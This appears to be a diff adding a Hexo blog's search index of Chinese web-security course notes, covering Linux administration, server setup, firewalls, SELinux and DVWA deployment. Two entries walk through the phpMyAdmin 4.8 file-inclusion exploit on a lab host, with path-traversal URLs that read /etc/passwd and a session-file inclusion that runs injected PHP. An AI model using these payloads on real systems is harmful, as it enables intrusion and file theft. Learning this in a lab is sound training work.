@@ -1,0 +1,90 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search>
+  <entry>
+    <title><![CDATA[welcome]]></title>
+    <url>%2F2019%2F07%2F30%2Fwelcome%2F</url>
+    <content type="text"><![CDATA[]]></content>
+  </entry>
+  <entry>
+    <title><![CDATA[note12]]></title>
+    <url>%2F2019%2F07%2F30%2Fnote12%2F</url>
+    <content type="text"><![CDATA[Abstract: 初学HTML 1. 些简单的标签12345678910111213&lt;html&gt; //&lt;html&gt;与&lt;/html&gt;之间的文本描述网页 &lt;head&gt; &lt;title&gt;网页标题&lt;/title&gt; &lt;/head&gt; &lt;body&gt; //&lt;body&gt;与&lt;/body&gt;之间的文本是可见的页面内容 &lt;h1&gt; 这是一个标题 //一级标题 &lt;/h1&gt; &lt;p&gt; 这是一个段落 //段落部分 &lt;/p&gt; &lt;/body&gt;&lt;/html&gt; 2. html中的标签：12345* HTML标题是通过`&lt;h1&gt;-&lt;h6&gt;`等标签进行定义的* HTML段落是通过`&lt;p&gt;`标签进行定义的* HTML链接是通过`&lt;a&gt;`标签进行定义的* HTML图像是通过`&lt;img&gt;`标签进行定义的* HTML表格是通过`table/thead/tbody/th/td`等标签来定义的 3. HTML form表单1&lt;form action="www.baidu.com" method="get" enctype="application/x-form-urlenconded"&gt; 123* Action 属性表明表单将要提交到哪里* Method 表示提交用的方法分别为`get`和`post`可选* Enctype 规定在发送表单数据前对数据进行编码的格式 4. 输入框&lt;input&gt;标签最常用1234567* `type=&quot;text&quot;` 普通的文本输入框* `type=&quot;password&quot;`带星号的密码输入框* `type=&quot;radio&quot;`单选框，同一类型要有统一的`name`属性，表明是一类* `type=&quot;checkbox&quot;`复选框，添加`checked`属性会默认选中* `type=&quot;file&quot;` 文件上传选择* `type=&quot;email&quot;`带简单验证的邮箱输入* `&lt;textarea&gt;`标签input只能单行输入，`textarea`可以多行输入]]></content>
+      <categories>
+        <category>Web Security</category>
+      </categories>
+      <tags>
+        <tag>HTML</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[stage1知识盲点]]></title>
+    <url>%2F2019%2F07%2F30%2Fstage1-exam%2F</url>
+    <content type="text"><![CDATA[Abstract: 知识盲点总结 运行一个脚本，用户不需要什么样的权限？ read write execute browse on the directory 在bash中，在一条命令后加入1&gt;&amp;2意味着： 标准错误输出重定向到标准输入 标准输入重定向到标准错误输出 标准输出重定向到标准错误输出 标准输出重定向到标准输入 1表示标准输出，2表示标准错误，&amp;表示等同于的意思 下面哪条命令可以把f1.txt复制为f2.txt： cp f1.txt |f2.txt cat f1.txt | f2.txt cat f1.txt &gt; f2.txt copy f1.txt | f2.txt 如何显示Linux系统中注册的用户数（包含系统用户）？ account-l nl /etc/passwd |head wc –user /etc/passwd wc –lines /etc/passwd word count，--line/-l只显示行数 命令kill 9的含义是： kills the process whose PID is 9 kills all processes belonging to UID 9 sends SIGKILL to the process whose PID is 9 sends SIGTERM to the process whose PID is 9 在vi中退出不保存的命令是： :q :w :wq :q! 下面哪个协议使用了两个以上的端口： telnet FTP rsh HTTP 什么命令用来只更行已经安装过的rpm软件包： rpm -U *.rpm rpm -F *.rpm rpm -e *.rpm rpm -q *.rpm ping使用的协议是： TCP UDP SMB ICMP Linux系统中添加一个用户，改变账号过期时间，用哪个命令： usermod -a usermod -d usermod -x usermod -e 静态IP和动态IP的区别，具体应用场景 静态IP：IP地址是手动分配的，通常需要付费 动态IP：动态IP是自动分配的 名称 优点 缺点 静态IP 地址不变—适用于web服务器，电子邮件服务器和其他internet服务器 比动态IP贵 静态IP对于VoIP和游戏应用程序更可靠 需要额外的安全性 动态IP 比静态IP地址便宜 需要DHCP服务器才能获取IP地址 更改IP地址可提供更多隐私 非静态的，每次IP地址更改时，可能需要再次找到你的IP 搭建LAMP所需要的命令： 123456789101112131415161718192021222324252627#安装apache服务[root]$ yum install httpd#设置开机启动[root]$ systemctl enable httpd#开启服务[root]$ systemctl start httpd#设置防火墙[root]$ firewall-cmd --zone=public --add-port=80/tcp --permanent[root]$ firewall-cmd --zone=public --add-port=433/tcp --permanent#重新加载，方可生效[root]$ firewall-cmd --reload#安装mysql服务[root]$ yum install mariadb-server#设置开机启动[root]$ systemctl enable mariadb#启动服务[root]$ systemctl start mariadb#初始化mysql[root]$ mysql_secure_installation#安装php[root]$ yum install php php-gd php-mysql php-pdo php-*#重启apache[root]$ systemctl restart httpd#修改网站根目录的用户和用户组[root]$ chown -R apache:apache /var/www/html]]></content>
+      <categories>
+        <category>Web Security</category>
+        <category>summary</category>
+      </categories>
+      <tags>
+        <tag>Linux基本命令 - 搭建服务</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[markdown语法]]></title>
+    <url>%2F2019%2F07%2F29%2Fsimpleapp%2F</url>
+    <content type="text"><![CDATA[Abstract: 用typora写markdown文档的语法 标题下划线 下划线 强调重要 斜体斜体 删除删除 方框框起来 注释今天吃啥呀^1 高亮==高亮== 角标上角标：x^2^ 下角标：H2O $x^2+x1$ 转义# List有序 无序 1 2 1 2 todo list 背单词 整理笔记 Table 分割线 插入链接Typora 数学公式$$&lt;Empty \space Math \space Block&gt;$$ 代码12def abc() print() 表情:sweat: :happy: 引用[引用] 引用 目录[TOC]]]></content>
+      <categories>
+        <category>markdown</category>
+      </categories>
+      <tags>
+        <tag>typora</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[week2sum]]></title>
+    <url>%2F2019%2F07%2F29%2Fweek2sum%2F</url>
+    <content type="text"><![CDATA[Abstract: 对第二周学习的内容进行总结 周一Linux权限1.内容简介 Linux权限控制 git服务器搭建与安全检查 tomcat服务器搭建与安全检查 2.几种文件类型 [d] 是目录 [-] 是文件 [l] 是链接文件(link file) 3.读写执行权限 文件类型 属主权限 属组权限 其他用户权限 0 123 456 789 d rwx r-x r-x 目录文件 读写执行 读—执行 读—执行 对于目录的rwx 123* r可以显示文件夹的结构* w可以在文件夹里添加删除文件* x可以进入到文件夹 权限命令：rwx在系统中对应一个个的值，r-4，w-2，x-1 chown修改当前文件或文件夹的所属用户 1chown root:root /tmp/tmp1 1chown -R root:root /tmp/tmp1 chmod修改当前文件或文件夹的权限 语法：chmod [who] [+|-|=] [mode] 文件名 操作对象who： u表示“用户(user)”，即文件或目录的所有者 g表示”同组(group)用户”，即与文件属主有相同组ID的所有用户 o表示”其他(other)用户” a表示”所有(all)用户”，它是系统默认值 推荐使用数字的方式修改文件或者文件夹的权限 操作符可以是： +添加某个权限 -取消某个权限 =赋予给定权限并取消其他所有权限 *不指定用户的情况下，=只会给文件所有者加权限，+给所有者加权限 一个网站最合理的权限是755 4.渗透测试中常用的命令 whoami 查看当前用户 tar 压缩和解压文件 netstat 查看网络状态 nslookup 查看dns信息 ps 查看运行的程序 top 实时查看运行的程序 service 使用service控制服务启动关闭 curl 获取网页，可以使用输出重定向来下载文件 wget 下载文件 1more /etc/apt/sources.list sources.list是各种软件源，常用的源有阿里云、清华大学、中科院 1sudo apt-get update Note: 推荐关机快照 周二tomcat和git服务器搭建1.内容简介 复习 tomcat服务器搭建 2.网络不通该如何调试先用ficonfig查看网卡信息，若正常，ping 网卡，若不正常，查看配置文件和网络环境；若网卡默认不启用，修改配置文件，onboot=yes 重启网络服务，配置文件路径：/etc/sysconfig/network-scripts/ifcfg-eth0 123cat /etc/sysconfig/network-script/ifcfg-eth0vi /etc/sysconfig/network-script/ifcfg-eth0service network restart 若网络环境是dhcp，修改上网方式为dhcp，重启网络服务 若网络环境是静态ip，修改上网方式为static，ipaddr=, netmask=, gateway= 能够ping通8.8.8.8 1curl www.baidu.com 若不能打开，查看dns配置文件 1vi /etc/resolv.conf 添加servername 1.1.1.1 3.搭建tomcat服务器12345#启动防火墙systemctl start firewalld#将80端口添加到防火墙例外并重启firewall-cmd --zone=public --add-por=8080/tcp --permanentfirewall-cmd --reload 防火墙=硬件+软件 1yum apt-get -y install tomcat 1vi .../apache-tomcat-8.5.43/webapps/manager/META-INF/context.xml 修改tomcat配置文件为 12345&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;Context antiResourceLocking="false" privileged="true"&gt; &lt;Valve className="org.apache.catalina.valves.RemoteAddrValve" allow="\d+\.\d+\.\d+\.\d+" /&gt;&lt;/Context&gt; 进入conf目录下修改tomcat-users.xml 用户名和密码 1vi /usr/local/tomcat/conf/tomcat-users.xml 1234567891011&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;tomcat-usersversion="1.0" xsi:schemaLocation="http://tomcat.apache.org/xml tomcat-users.xsd" xmlns:xsi="http://www/w3.org/2001/XMLSchema-instance" xmlnx="http://tomcat.apache.org/xml"&gt; &lt;role rolename="manager-gui"/&gt; &lt;role rolename="manager-script"/&gt; &lt;role rolename="manager-jmx"/&gt; &lt;role rolename="manager-status"/&gt; &lt;role rolename="admin-gui"/&gt; &lt;role rolename="admin-script"/&gt; &lt;role rolename="manager-gui"/&gt; &lt;user roles="manager-gui, manager-script, manager-jmx, manager-status, admin-script" password="tomcat" username="tomcat"/&gt;&lt;/tomcat-users&gt; 4.git服务器搭建12345#修改yum源cat CentOS-Base.repo#[base]注释掉mirrorlist和baseurl添加以下语句baseurl=http://192.168.100.110:8000/yum/#以下三个修改为enable=0 12345678910111213141516171819#下载git[root@localhost]$ yum install git#添加git用户[root@localhost]$ useradd git[root@localhost]$ cd /home/git/[root@localhost]$ lltotal 0[root@localhost]$ pwd/home/git[root@localhost]$ cd ..[root@localhost]$ su git[git@localhost]$ mkdir .ssh[git@localhost]$ cd .ssh/[git@localhost]$ touch authorized_keys[git@localhost]$ chmod 600 authorized_keys[git@localhost]$ cd /[git@localhost~]$ mkdir Project[git@localhost~]$ cd Project[git@localhost Project]$ git init --bare icq.git win10启动powershell dir ssh 1ssh-keygen -t rsa 产生两个文件.pub是公钥 123dir .sshtype .\.ssh\id_rsa.pub#获得公钥 粘贴到git用户authorized_keys 12chmod 700 .sshchmod 600 authorized_keys 1yum install git 再创建用户git //管理git中所有的项目 在git用户家目录，创建.ssh文件夹，修改权限为700 //这个是因为ssh服务限制 在.ssh文件夹下创建authorized_keys文件 ，修改权限为600 //这个因为ssh服务的限制，权限不正确认证会失败 在git用户家目录创建project目录，用来存放git项目 12#初始化一个git项目git init --bare icq.git git客户端 安装git // git for windows git for linux windows 10 使用ssh创建公钥和私钥 ssh-keygen -t rsa 就会在家目录创建.ssh文件夹，里面就会有两个文件，将公钥(.pub结尾)写入到服务器authorized_keys文件中 1git clone git@ip:/home/git/project/icq.git Note:默认情况下 ssh git@192.168.100.167可以登录虚拟机，从而产生安全问题，在虚拟机里切换到root权限修改git的shell 1[root@localhost ~] usermod -s /sbin/nologin git 这样ssh就禁止了 5.搭建博客 安装Github桌面版和Node.js 然后cmd中 1npm install -g hexo-cli --registry=https://registry.nom.taobao.org 创建一个blog目录，用来存放博客 进入到blog中，启动cmd执行命令 123456#初始化hexohexo init#生成博客hexo g#搭建服务hexo s 然后浏览器访问播客主页 安装CentOs Mini，安装好后执行 1yum groupinstall "development tools" 周三Linux下应用的安装1.CentOS系统中有三种安装软件的方法 通过源码安装 ./configure make &amp;&amp; make install 通过rpm安装 rpm -ivh … 通过yum安装 yum search … yum install … rpm类型文件安装的时候，会先去读取文件内记载的设置参数内容，然后将该数据用来比对linux系统的环境，以找到是否有属性相依的软件尚未安装的问题。RPM使用自动化安装软件，比较类似windows下的.exe需要下载的安装包，但是它安装过程中会有很多依赖问题。 -q: 仅查询，后面接软件名称是否有安装 -qa: 列出所有，已经安装在本机linux系统上面的所有软件名称 -ql: 列出该软件所有的文件与目录所在完整文件名(list) -qR: 列出与该软件有关的相依软件所在的文件(requried) 源码安装：先阅读README文件，找到安装方法，安装相依赖的库，最后执行 1make &amp;&amp; make install 周四搭建apache+php+mysql和iptables+firewall1.昨天回顾12345yum installrpm -ivh a.rpm/http/ftp:baidu.com/a.tpm nginx.tar.gztar cat readme install./configure --help --prefix=安装路径 --with-apr=指定依赖位置make &amp;&amp; make install 2.搭建apache+php+mysql环境(要求使用php5.6) 安装httpd 12345678#安装httpdyum install httpd httpd-devel httpd-manual mod_ssl -y#启动apachesystemctl start httpd#设置apache开机启动systemctl enable httpd#查看开放端口，检查有没有httpd服务，80和443端口是否开放ss -antlp 配置防火墙，可以正常访问apache 123firewall-cmd --zone=public --add-port=80/tcp --permanentfirewall-cmd --zone=public --add-port=433/tcp --permanentfirewall-cmd --reload 安装php5.6 12345678910rpm -Uvh https://mirror.webtatic.com/yum/el7/epel-release.rpmrpm -Uvh https://mirror.webtatic.com/yum/el7/webtatic-release.rpm#卸载系统中原有的phpyum remove php-common -y#安装php5.6和php扩展yum install -y php56w php56w-opcache php56w-xml php56w-mcrypt php56w-gd php56w-mysql php56w-intl php56w-mbstring#进入网站根目录cd /var/www/html/#在网站根目录中创建index.php，写入phpinfo函数，测试网站php是否正常echo '&lt;?php phpinfo();?&gt;' &gt; index.php 安装mariadb 123456789yum install mariadb-server -y#启动mariadb-serversystemctl start mariadb#设置mariadb-server开机自启systemctl enablemariadb#初始化mysql，注意记住mysql密码mysql_secure_installation#关机+快照poweroff 3.关于网站搭建：需要将网站的源代码使用工具复制到虚拟机中的网站根目录下(phpmyadmin除外)，修改网站的所有者为apache 1chown -R apache:apache /var/www/html wordpress特性： ​ 移动网站后，网站的样式将出错，所以wordpress在安装成功后，不能移动 ​ 虚拟机ip改变后，wordpress打开会卡页面，需要去数据库中修改ip wp_options表中 ​ siteurl: http://新ip ​ home: http://新ip 搭建没有提供安装引导的网站： ​ 上传网站源代码到网站根目录，找到网站的配置文件，一般是config.php ​ 再找到网站提供的sql文件，使用phpmyadmin之类工具，导入数据或直接使用mysql -uroot -p 登录数据库 123create database database_nameuse database_namesource absolute_path/name.sql 向数据库中导入内容，有多重方式，可以自行测试 周五Linux安全检查1.防火墙功能：​ filter功能是防火墙一个重要功能，它定义数据通过是允许或者不允许 ​ filter控制数据类型分为两类：INPUT和OUTPUT 2.Iptables命令讲解：-A 追加 -p 指定协议类型 123* tcp通过dport指定目标端口，sport指定源端口* udp通tcp* icmp通过--icmp-type指定类型，0是响应类型的数据包，8是请求类型的包 -m 表示启动扩展功能 ​ 一般和-p配合，-p指定类型后，通过-m打开此类型的扩展功能 -j 指定如何进行处理DROP，REJECT，ACCEPT/丢弃，拒绝，通过 1iptables -A INPUT/OUTPUT -j DROP/REJECT/ACCEPT 编辑iptables的配置文件： ​ 通过编辑文件可以直接修改iptables规则，编辑文件，写入指定规则： 123456-A INPUT -m state --state ESTABLISHED, RELATED -j ACCEPT-A INPUT -p icmp -j ACCEPT-A INPUT -i lo -j ACCEPT-A INPUT -m state --state NEW -m tcp -p tcp --dport 22 -j ACCEPT-A INPUT -j REJECT --reject-with icmp-host-prohibited-A FORWARD -j REJECT --reject-with icmp-host-prohibited 12#查看现有规则iptables -nvL 12#添加80端口通过的规则firewallc-cmd --zone=public --add-port=80/tcp --permanent drop 默认丢弃所有包 –zone block 拒绝所有外部连接，允许内部发起连接 public 指定外部连接可以进入 –add-port 指定添加端口 80/tcp 53/udp –add-service 指定常见服务 http https mysql mssql ssh –permanent 永久生效 删除80端口通过的规则 1firewall-cmd --zone=public --remove-port=80/tcp --permanent –remove-port 指定删除端口 –remove-service 指定删除服务 12345678910#防火墙更新规则firewall-cmd --reload#防火墙显示所有规则firewall-cmd --list-all#关闭防火墙systemctl stop firewalld#查看防火墙状态systemctl status firewalld#启动防火墙systemctl start firewalld 临时加立即生效，–reload后失效，–pernament必须，–reload后才失效]]></content>
+      <categories>
+        <category>Web Security</category>
+      </categories>
+      <tags>
+        <tag>summary</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[note11]]></title>
+    <url>%2F2019%2F07%2F29%2Fnoteday11%2F</url>
+    <content type="text"><![CDATA[1. SELINUX即Security-Enhanced Linux，是一个Linux内核模块，也是Linux的一个安全子系统。SELinux作用是最大限度地减少系统中服务进程可访问的资源（最小权限原则）。 如果一个以root身份运行的网络服务存在0day漏洞，黑客就可以利用这个漏洞，以root的身份在您的服务器上为所欲为。SELinux就是解决这个问题。 系统 资源能否被访问因素 无SELinux 某资源是否拥有对应用户的权限（读写执行） SELinux 还需要判断每一类进程是否拥有对某一类资源的访问权限 SELinux的工作模式 模式名称 工作模式 作用 enforcing 强制模式 违反SELinux规则的行为将组织并记录到日志中 permissive 宽容模式 违反SELinux规则的行为只会记录到日志中，调试用 disabled 关闭模式 关闭SELinux SELinux工作模式可以在/etc/selinux/config中设定 12#修改SELinux模式vi /etc/selinux/config 修改以后重启系统即可。 2.phpmyadmin4.8文件包含漏洞goto_whitelist白名单如下： 12345678910public static $goto_whitelist = array( 'db_datadict.php', 'db_sql.php', 'db_events.php', 'db_export.php', 'db_importdocsql.php', 'db_multi_table_query.php', 'db_structure.php', 'db_import.php',) 进入Vulnspy开始实验 从index.php定位到白名单中的php文件 1http://3395a164a7f3b89d07d1e02cf6a3792e.vsplate.me:28268/index.php?target=db_export.php? 将?改%253f读取系统文件，进行多次 ./以进入到系统的根目录，然后读取/etc/passwd 1http://3395a164a7f3b89d07d1e02cf6a3792e.vsplate.me:28268/index.php?target=db_export.php%253f../../../../../../../../../../etc/passwd Note: target=后面的文件填写白名单文件均可成功，?要用%253f代替 点击SQL输入 1select &apos;&lt;?php phpinfo(); exit;?&gt;&apos; Note:phpmyadmin特性是所有sql查询语句都早sess_id中存储着。 sess_id在/var/lib/php/session/目录中 3. docker容器类似于虚拟机，依赖与linux 1234567891011#查看创建的镜像docker images#启动dockerservice docker start#修改docker的用户组sudo usermod -G docker $USER#重启虚拟机rebootrebootdocker imagesdocker-composedocker run --rm -it alpine /bin/bash]]></content>
+      <categories>
+        <category>Web Security</category>
+      </categories>
+      <tags>
+        <tag>SELinux - phpmyadmin</tag>
+        <tag>docker</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[phpmyadmin-bug]]></title>
+    <url>%2F2019%2F07%2F28%2Fphpmyadmin-bug%2F</url>
+    <content type="text"><![CDATA[Abstract: phpmyadmin4.8漏洞演示 进入vulnsp网站，点击start to hack，跳转到VSPlat 点击进入实验，点击开始按钮 进入phpmyadmin登录界面，用户名：root，密码：toor登录 点击SQL，输入如下命令： 1select &apos;&lt;?php phpinfo(); exit;?&gt;&apos; 获取自己的SESSION ID 1session_id = d0fn5a9nckc5hu90j6re5glj3mmtdbpf 包含SESSION文件，成功利用该漏洞 1http://079d4a227c7ba70a8fd8e0a5f6bde15a.vsplate.me:47529/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/sessions/sess_d0fn5a9nckc5hu90j6re5glj3mmtdbpf 网页输入payload，页面如下，成功利用该漏洞]]></content>
+      <categories>
+        <category>Web Security</category>
+      </categories>
+      <tags>
+        <tag>phpmyadmin</tag>
+        <tag>bug</tag>
+        <tag>文件包含漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[dvwa-deploy]]></title>
+    <url>%2F2019%2F07%2F28%2Fdvwa-deploy%2F</url>
+    <content type="text"><![CDATA[Abstract: CentOS7部署DVWA DVWA（Damn Vulnerable Web Application）是一个用来进行安全脆弱性鉴定的PHP/MySQL Web应用，旨在为安全专业人员测试自己的专业技能和工具提供合法的环境，帮助web开发者更好的理解web应用安全防范的过程。 安装步骤 1.进入到/var/www目录下，然后wget下载dvwa文件，解压master.zip文件到html文件夹下，进入html文件夹下，修改DVWA-master文件名为dvwa，进入dvwa/config文件夹中，把config.inc.php.dist复制一份，命名为config.inc.php；‘cd /var/www’ &apos;wget https://github.com/ethicalhack3r/DVWA/archive/master.zip&apos; &apos;unzip master.zip -d html/&apos; &apos;cd html &amp;&amp; mv DVWA-master dvwa&apos; &apos;cd dvwa/config/&apos; &apos;co config.inc.php.dist config.inc.php&apos; 2.进入到/etc目录，先把php.ini备份一份名为php.ini.bak.20190727，打开php.ini，把allow_url_include=Off修改为On，保存退出，重启服务；‘cd /etc’ &apos;cp php.ini php.ini.bak.20190727&apos; &apos;vi php.ini&apos; &apos;systemctl restart httpd&apos; 3.进入/var/www/html/dvwa/config目录下，修改config.inc.php，把$_DVWA[ ‘db_password’ ]修改为mysql中root用户密码，并填写公钥和私钥，保存后退出；public_key: 6LePqhAUAAAAAH6Bn2okO9-8G-zNw46PNhotV4Q6private_key: 6LePqhAUAAAAAMVqhBbFr1NVA9H13FkyfAgBeZYx &apos;cd /var/www/html/dvwa/config&apos; &apos;vi config.inc.php&apos; 4.进入/var/www/html文件中，修改dvwa的用户和用户组‘chown -R apache:apache dvwa/‘ &apos;systemctl restart httpd&apos; 5.部署成功后，登录界面如下图所示，用户名：admin，密码：password，即可登录]]></content>
+      <categories>
+        <category>Web Security</category>
+      </categories>
+      <tags>
+        <tag>dvwa</tag>
+        <tag>linux</tag>
+      </tags>
+  </entry>
+</search>
